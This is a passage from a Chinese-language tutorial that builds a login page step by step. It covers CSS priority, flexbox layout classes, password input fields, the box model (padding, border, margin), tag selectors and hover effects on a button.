class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上代码有几点我们需要注意</p><ol><li>图片请你放到自己的项目文件夹里，static目录是专门用来放网站的静态资源的，就是图片视频这种东西，然后在网页中应该如何引用呢，<code>static/angry.gif</code>表示的就是项目文件夹里的static目录下的angry.gif文件，<code>alt</code>属性是说如果因为网络问题加载失败，或者盲人模式这张图片不显示的时候，给用户一段提示，你可以写图片加载失败，但是我一般比较懒，就不写了，图片加载失败就看不见呗，懒得给用户提示了。</li><li>有同学说，我发现就直接复制的链接也可以用，根本不需要保存到本地这么麻烦，我简直是天才，我只能说你这样的行为叫做盗链，并不高端也不光彩，但这事我也干过，之前我帮一个人做在线网课平台，那个人是一个补习班的老板，视频靠爬虫就算了，服务器也买不起，我只能把视频放到别人的服务器，然后盗链播放，如果你听不懂的话，那就不要琢磨了，什么知识都学只会害了你。总之就是不要偷我的链接，偷了我的图片还要占用我服务器的带宽流量资源，有点不合适。</li><li>标题标签还记得吧，但是不要那么大，我觉得四级标题挺合适。</li></ol><h2 id="11-代码优化"><a href="#11-代码优化" class="headerlink" title="11.代码优化"></a>11.代码优化</h2><p>之前在讲行内样式的时候提了一个问题：通过行内样式去给元素添加样式显然非常方便，但是这样做的弊端是什么？</p><p>其实做到这一步大家也发现了，行内样式需要把代码写到同一行上，看上去不好看，维护起来也恶心，代码的复用性还很差，我们做了很多重复性的工作，因为几乎每个区域都要写一遍弹性盒子布局的样式。</p><p><strong>内部样式与行内样式的优缺点对比</strong></p><ol><li>内部样式：简单来说就是把样式统一写到<code>&lt;style&gt;</code>标签里，叫做内部样式，这样的好处是html和css是分开的，这样显得比较整洁，而且样式可以重复使用。</li><li>行内样式：直接在标签中加上<code>style=""</code>，就可以给这个标签添加样式了，不需要取名，好处是非常快，缺点上面也说了。</li></ol><p>我们现在对代码做亿点优化。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 网页主体 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flex_column<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 标题区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title_section flex_row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">&gt;</span></span>用户登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">&gt;</span></span>X<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 图片区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>image_section flex_column<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>../../static/logo.png<span class="token punctuation">"</span></span> <span class="token attr-name">mode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h4</span><span class="token punctuation">&gt;</span></span>Hi、请登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h4</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 用户输入区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input_secition<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 按钮区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button_section<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">.title_section</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 10vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> antiquewhite<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.image_section</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 25vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> darkgray<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.input_secition</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 30vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> darkseagreen<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.button_section</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 20vh<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> pink<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/* 弹性盒子横着排 */</span><span class="token selector">.flex_row</span><span class="token punctuation">{</span>    <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span> <span class="token comment">/* 排列方式：弹性盒子 */</span>    <span class="token property">flex-direction</span><span class="token punctuation">:</span> row<span class="token punctuation">;</span><span class="token comment">/*排列方向：横向*/</span>    <span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*主轴居中*/</span>    <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*副轴居中*/</span><span class="token punctuation">}</span><span class="token comment">/* 弹性盒子竖着排 */</span><span class="token selector">.flex_column</span><span class="token punctuation">{</span>    <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span> <span class="token comment">/* 排列方式：弹性盒子 */</span>    <span class="token property">flex-direction</span><span class="token punctuation">:</span> column<span class="token punctuation">;</span><span class="token comment">/*排列方向：纵向*/</span>    <span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*主轴居中*/</span>    <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*副轴居中*/</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这里我提前准备了两个样式，一个是弹性盒子横着排，一个是弹性盒子竖着排，如果我想把哪个盒子设为弹性盒子，我就把这个标签的class设为<code>flex_row</code>或者<code>flex_column</code>。</p><p><strong>重点口诀</strong>：</p><ul><li>横盒（横向的弹性盒子）里的东西横着排</li><li>竖盒（纵向的弹性盒子）里的东西竖着排</li></ul><h2 id="12-CSS的优先级"><a href="#12-CSS的优先级" class="headerlink" title="12.CSS的优先级"></a>12.CSS的优先级</h2><p>我们运行上面的代码其实又发现一点问题，就是我准备的两个弹性盒子样式，对齐的方式都是默认居中的，但是标题区域主轴方向应该是分布到两边对齐的。</p><p>遇到这种情况先看看我的解决方案吧。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- 标题区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title_section flex_row<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">justify-content</span><span class="token punctuation">:</span> space-around<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">&gt;</span></span>用户登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">&gt;</span></span>X<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们在内部样式<code>flex_row</code>中定义了<code>justify-content: center;</code>，然后在行内样式中又定义了<code>justify-content: space-around;</code>，两个不一致的时候它到底听谁的，这个就涉及到优先级的问题，优先级为<strong>行内样式&gt;内部样式&gt;外部样式</strong>，总结来说就是离标签元素越近，优先级越高。<br><strong>总结</strong>：因为行内样式优先级更高，我们通过行内样式，修改了它的对齐方式为分布对齐。</p><h2 id="13-输入标签"><a href="#13-输入标签" class="headerlink" title="13.输入标签"></a>13.输入标签</h2><p>我们先试一下下面这段代码，我们在用户输入区域加上了一个input输入框。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- 用户输入区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input_secition<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>但是我们发现这个输入框确实可以用，但是一点都不好看。</p><p>我们还需要对其做一些优化才行，仔细看看，和我做的还有什么区别吗？是不是还有输入框中的提示文字没有，这个效果是怎么实现的呢，其实input标签中的<code>placeholder</code>属性就是用来设置提示文字的。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- 用户输入区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input_secition<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入用户名<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入密码<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们放了两个输入框上去，分别是用户名输入框和密码输入框，你可以输入一下试一下，仔细和设计图对比，发现问题了吗？</p><p>密码输入框所输入的内容是不是应该隐藏起来，而不是直接显示出来，这样容易被别人窥屏，非常不安全。</p><p>修改的方法也非常容易，就是将密码输入框的type改成password就可以了。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- 用户输入区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input_secition<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入用户名<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入密码<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有细心的同学可能发现了，输入标签和我的有一点点区别，输入框周围没有边框，但是其实也不影响我们使用，只是用户用上去的体验不会太好罢了，所以为什么我们要用css对样式进行美化装修，程序员不仅是建造师，也是艺术家，要有一定的审美水平。</p><p>我们来做一下输入框的边框吧。</p><h2 id="14-内边距、边框、外边距"><a href="#14-内边距、边框、外边距" class="headerlink" title="14.内边距、边框、外边距"></a>14.内边距、边框、外边距</h2><p>讲到边距的话我们干脆来讲一下盒子模型吧，课本上这部分内容要讲几节课，其实就是三个东西，<strong>内边距</strong>，<strong>边框</strong>，<strong>外边距</strong>，直接运行代码大家感受一下吧。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">input</span><span class="token punctuation">{</span><span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span><span class="token property">border</span><span class="token punctuation">:</span> 1px solid black<span class="token punctuation">;</span><span class="token comment">/*1像素粗细 实线 黑色*/</span><span class="token property">margin</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>border是设置边框的属性，我们需要分别设置边框的粗细，类型和颜色，在上面这个案例中，我设置边框为1个像素的黑色实线，你如果觉得太细了，或者想换成别的颜色也可以自己修改一下，还可以设置为虚线类型（<code>dotted</code>）的边框。</p><p>观察一下上面这段代码，我增加了三行代码以及注释，体会到内边距、边框、和外边框的作用了吗？<br>总结一下吧。</p><table><thead><tr><th>css属性</th><th>作用</th></tr></thead><tbody><tr><td>margin</td><td>外边距</td></tr><tr><td>border</td><td>边框</td></tr><tr><td>padding</td><td>内边距</td></tr></tbody></table><p>但是我们发现直接设置padding的话，是四周都有边距，但是我们想要左边的内边距多一点，应该怎么办呢？大家观看表格自己解决。</p><table><thead><tr><th>css属性</th><th>作用</th></tr></thead><tbody><tr><td>padding-top</td><td>设置上边距</td></tr><tr><td>padding-bottom</td><td>设置下边距</td></tr><tr><td>padding-right</td><td>设置右边距</td></tr><tr><td>padding-left</td><td>设置左边距</td></tr></tbody></table><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">input</span><span class="token punctuation">{</span><span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span><span class="token property">padding-left</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span><span class="token property">border</span><span class="token punctuation">:</span> 1px solid black<span class="token punctuation">;</span><span class="token property">margin</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>padding我用了简写的方式，因为我想要上下的边距小，左右的边距大，如果四个方向一一设置就太麻烦了，可以通过<code>padding:上下 左右</code>，来设置两个方向的边距，也可以设置四个方向的边距，顺序依次是<code>padding:上 左 下 右</code></p><h2 id="15-标签选择器"><a href="#15-标签选择器" class="headerlink" title="15.标签选择器"></a>15.标签选择器</h2><p>对了，差点忘了，还有个事情忘了说，大家发现input前面怎么没有<code>.</code>，为什么和别的不一样，因为我这里使用了标签选择器，是给所有的input标签设置样式。给大家归纳一下。</p><table><thead><tr><th>css选择器</th><th>示例</th></tr></thead><tbody><tr><td>类选择器</td><td>.input_box可以选中所有<code>&lt;div class="input_box"&gt;</code></td></tr><tr><td>标签选择器</td><td>input可以选中所有<code>&lt;input&gt;</code>标签</td></tr></tbody></table><p>之后还有什么id选择器，伪类选择器，以后遇到再说吧，说多了怕你晕。</p><h2 id="16-输入区域布局"><a href="#16-输入区域布局" class="headerlink" title="16.输入区域布局"></a>16.输入区域布局</h2><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- 用户输入区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input_secition flex_column<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- 用户名和用户名的输入框 --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flex_row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>用户名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入账号<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- 密码和密码的输入框 --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flex_row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>密码：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入密码<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入区域的布局稍微复杂一点，我们在布局的时候一般会把类似的东西当作是一个box，比如文字+输入框就是一个盒子，这里我姑且称它为输入盒，输入盒中的两个元素是横向排列的，两个输入盒之间又是纵向排列的，应该不是很绕，你理清楚了吗？</p><h2 id="17-button标签"><a href="#17-button标签" class="headerlink" title="17.button标签"></a>17.button标签</h2><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>login_button<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">.login_button</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 30vw<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span> cadetblue<span class="token punctuation">;</span><span class="token property">font-weight</span><span class="token punctuation">:</span> 600<span class="token punctuation">;</span><span class="token property">border</span><span class="token punctuation">:</span> 1px skyblue solid<span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="18-伪类选择器"><a href="#18-伪类选择器" class="headerlink" title="18.伪类选择器"></a>18.伪类选择器</h2><p>对比一下设计图，我现在现在还差最后一个效果，就是当鼠标悬浮在这个按钮上面的时候，按钮的颜色会发生变化，这个效果是怎么实现的呢？</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>login_button<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">.login_button</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 30vw<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span> cadetblue<span class="token punctuation">;</span><span class="token property">font-weight</span><span class="token punctuation">:</span> 600<span class="token punctuation">;</span><span class="token property">border</span><span class="token punctuation">:</span> 1px skyblue solid<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.login_button:hover</span><span class="token punctuation">{</span><span class="token property">background-color</span><span class="token punctuation">:</span> cadetblue<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>鼠标放上去我希望按钮能够改变颜色，我用到了伪类选择器:hover，它可以匹配鼠标悬停其上的元素，你要是问我伪类是什么，其实这些专有的名词我也搞不太懂，反正能用就完事，我们又不是搞学术研究的。总之说大白话就是:hover可以给元素添加鼠标悬停时的效果。</p><p><strong>注意：</strong>预览的时候请使用PC模式预览，不要用手机端，因为手机上是没有鼠标的，所以我们如果是开发APP的话，是不用考虑这个鼠标悬浮效果的。</p><h2 id="19-登录页面"><a href="#19-登录页面" class="headerlink" title="19.登录页面"></a>19.登录页面</h2><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 网页主体 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flex_column<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 标题区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title_section flex_row<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">justify-content</span><span class="token punctuation">:</span> space-around<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">&gt;</span></span>用户登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">&gt;</span></span>X<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 图片区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>image_section flex_column<span class="token 